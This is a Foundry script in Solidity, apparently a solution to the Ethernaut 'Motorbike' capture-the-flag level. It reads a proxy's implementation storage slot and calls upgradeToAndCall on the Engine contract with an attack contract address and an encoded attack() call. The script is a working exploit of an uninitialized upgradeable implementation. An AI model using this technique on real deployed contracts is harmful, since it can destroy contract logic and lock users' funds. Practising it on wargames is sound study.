// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "forge-std/Script.sol";
import {Motorbike, Engine} from "../src/Motorbike.sol";

contract DeployMotorbikeAttack is Script {
    Motorbike motorbike = Motorbike(0xBA1561903D1eb8740debe4AD3B93c7739A5a9aFB); // Proxy contract instance

    // vm.load(contract_address, slot_no) will return a bytes32 value and the address is 20 bytes
    // address(uint160(uint256())) is used to convert bytes32 to address
    Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));

    function run() external{
        vm.startBroadcast();

        //engineAddress.initialize();
        console.log("Engine address is:", address(engineAddress));
        console.log("Attacker upgrader is:", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("attack()");
        require(encodedData.length > 0, "Encoding of attack function failed");
        engineAddress.upgradeToAndCall(0x52d659D1f04c472678eD72F092c175D7c454bDa9, encodedData); // implementation contract points to attack contract address, encoded data

        vm.stopBroadcast();
    }
}
